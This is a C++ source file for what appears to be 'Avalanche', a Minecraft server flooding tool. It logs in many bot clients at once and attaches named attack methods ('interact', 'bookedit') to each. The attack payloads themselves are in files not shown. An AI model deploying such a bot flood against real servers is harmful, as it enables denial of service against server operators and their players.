#include "Avalanche.h"
#include "login/LoginFlood.h"
#include "login/LoginSequential.h"
#include "attack/AttackRegistry.h"
#include "attack/AttackInteract.h"
#include "attack/AttackBookEdit.h"

#include <fstream>
#include <memory>
#include <iostream>

namespace avalanche {

static const AttackRegistry attackRegistry = AttackRegistry::MethodRegistry {
    { "interact", [](mc::core::Client* client) -> std::unique_ptr<AttackMethod> { return std::make_unique<AttackInteract>(client); } },
    { "bookedit", [](mc::core::Client* client) -> std::unique_ptr<AttackMethod> { return std::make_unique<AttackBookEdit>(client); } },
};

void Avalanche::Run() {
    s32 activeInstances = m_LoginMethod->Login(m_Instances);

    std::vector<bool> instanceStatus(activeInstances, true);

    std::cout << "Successfully logged in " << activeInstances << "/" << m_Instances.size() << " instances." << std::endl;

    while (activeInstances > 0) {
        for (std::size_t i = 0; i < m_Instances.size(); ++i) {
            auto&& instance = m_Instances[i];

            if (!instanceStatus[i]) continue;

            auto state = instance.GetClient()->GetConnection()->GetSocketState();
            if (state != mc::network::Socket::Status::Connected) {
                instanceStatus[i] = false;
                --activeInstances;

                instance.SetAttackMethod(nullptr);

                std::cout << "Instance was kicked from server. " << activeInstances << " instances remaining." << std::endl;
                continue;
            }

            instance.GetClient()->Update();
        }
    }
}

bool Avalanche::Initialize(const OptionMap& options) {
    auto jsonIter = options.find("json");
    Json::Value attackNode;
    std::string attack;
    std::size_t count = 1;

    auto attackIter = options.find("attack");
    if (attackIter != options.end())
        attack = attackIter->second;

    if (jsonIter != options.end()) {
        std::string jsonFile = jsonIter->second;

        Json::Reader reader;
        Json::Value root;

        std::ifstream in(jsonFile);

        if (!in.is_open())
            throw std::runtime_error("Failed to read JSON file " + jsonFile);

        if (!reader.parse(in, root))
            throw std::runtime_error("Failed to parse JSON file " + jsonFile);

        auto&& countNode = root["count"];
        if (countNode.isInt())
            count = countNode.asInt();

        auto&& loginNode = root["login"];
        if (loginNode.isObject()) {
            auto&& methodNode = loginNode["method"];
            std::string methodName = "flood";

            if (methodNode.isObject()) {
                if (methodNode["name"].isString())
                    methodName = methodNode["name"].asString();
            }

            if (methodName == "flood") {
                m_LoginMethod = std::make_unique<avalanche::LoginFlood>();
            } else if (methodName == "sequential") {
                m_LoginMethod = std::make_unique<avalanche::LoginSequential>();
            }

            if (m_LoginMethod)
                m_LoginMethod->ReadJSON(loginNode);
        }

        if (attack.empty()) {
            attackNode = root["attack"];
            if (attackNode.isObject()) {
                auto&& methodNode = attackNode["method"];
                if (methodNode.isString()) {
                    attack = methodNode.asString();
                }
            }
        }
    }

    if (m_LoginMethod == nullptr)
        m_LoginMethod = std::make_unique<avalanche::LoginFlood>();

    if (!m_LoginMethod->ReadOptions(options)) {
        return false;
    }

    auto countIter = options.find("count");
    if (countIter != options.end())
        count = strtol(countIter->second.c_str(), nullptr, 10);

    m_Instances = std::vector<Instance>(count);

    for (auto&& instance : m_Instances) {
        if (!attack.empty()) {
            std::unique_ptr<AttackMethod> attackMethod = attackRegistry.CreateAttack(attack, instance.GetClient());

            if (attackMethod && !attackNode.isNull()) {
                attackMethod->ReadJSON(attackNode);
            }

            instance.SetAttackMethod(std::move(attackMethod));
        }
    }

    return true;
}

} // ns avalanche
